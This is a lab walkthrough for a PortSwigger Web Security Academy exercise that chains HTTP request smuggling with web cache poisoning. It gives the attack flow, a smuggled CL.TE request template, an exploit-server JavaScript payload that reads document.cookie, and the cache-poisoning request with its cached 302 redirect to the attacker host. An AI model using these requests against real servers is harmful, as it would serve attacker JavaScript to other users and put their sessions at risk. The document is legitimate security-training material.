
# HTTP Request Smuggling → Web Cache Poisoning


## Lab Overview


This lab demonstrates how **HTTP request smuggling** can be combined with **web cache poisoning**.


The front-end server does not support chunked encoding, while the back-end server does. This difference allows us to smuggle a second request to 

the back-end server.


## Attack Flow


```text

HTTP Request Smuggling

        ↓

Smuggle GET /post/next

        ↓

Use Exploit Server as Host

        ↓

Backend generates a redirect

        ↓

Poison the cache

        ↓

Victim requests tracking.js

        ↓

Cached 302 response

        ↓

Redirect to Exploit Server

        ↓
JavaScript executes

```



## Exploit Server



Create:



```text

/post

```



with:



```http

Content-Type: text/javascript

```



Body:



```javascript

alert(document.cookie)

```



## Smuggled Request



The general structure is:


```http

POST / HTTP/1.1

Host: YOUR-LAB-ID.web-security-academy.net

Content-Type: application/x-www-form-urlencoded

Content-Length: [calculated value]

Transfer-Encoding: chunked



0

GET /post/next?postId=3 HTTP/1.1

Host: YOUR-EXPLOIT-SERVER

Content-Type: application/x-www-form-urlencoded

Content-Length: 10



x=1

```


The front-end treats the first request as finished after the `0`, while the back-end interprets the following data as another request.


## Cache Poisoning


Request:


```http

GET /resources/js/tracking.js HTTP/1.1

Host: YOUR-LAB-ID.web-security-academy.net

Connection: close

```


A successful poisoning results in something similar to:


```http

HTTP/1.1 302 Found

Location: https://YOUR-EXPLOIT-SERVER/post?postId=4

X-Cache: hit

```


`X-Cache: hit` indicates that the response was served from the cache.



## Important Notes



* The attack requires **HTTP/1.1**.

* The `Content-Length` must match the actual payload being used.

* The **complete Exploit Server hostname** must be used exactly as provided.

* The cache may require multiple poisoning attempts because the lab simulates a victim making requests at intervals.

* The goal is not simply to obtain a `302`; the poisoned response must be served from the cache to the victim.


## Key Concept


> **Request smuggling** allows us to manipulate how the back-end parses requests, while **cache poisoning** makes the malicious response persist 
so that subsequent users receive it.

**Source:** [PortSwigger Web Security Academy — Web cache poisoning via request smuggling](https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning?utm_source=chatgpt.com)
